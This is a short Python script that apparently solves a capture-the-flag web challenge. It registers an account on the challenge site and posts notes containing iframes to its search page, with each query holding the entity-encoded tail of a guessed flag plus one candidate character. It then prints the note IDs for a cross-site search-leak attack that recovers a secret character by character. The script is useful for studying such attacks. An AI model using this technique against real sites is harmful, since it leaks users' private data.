import httpx
import string
import random
import sys
import re

BASE_URL = "https://leakynote.be.ax"
CHARS = "}abcdefghijklmnopqrstuvwxyz"

prefix = sys.argv[1]
print(f"{prefix = }")

username = "".join(random.choices(string.ascii_letters, k=8))
password = "".join(random.choices(string.ascii_letters, k=8))

client = httpx.Client()

res = client.post(
    f"{BASE_URL}/register.php",
    data={
        "name": username,
        "pass": password,
    },
)
assert res.status_code == 302

for c in CHARS:
    query = "".join([f"&#{ord(x)};" for x in (prefix + c)[-6:]])
    contents = f'<iframe src="/search.php?query={query}">'
    assert len(contents) <= 100
    res = client.post(
        BASE_URL,
        data={
            "title": "a",
            "contents": contents,
        },
    )
    assert res.status_code == 200

res = client.get(BASE_URL)
ids = re.findall(r"<a href='/post\.php\?id=([0-9a-f]+)'>", res.text)
print(f"const TARGET_IDS = {ids};")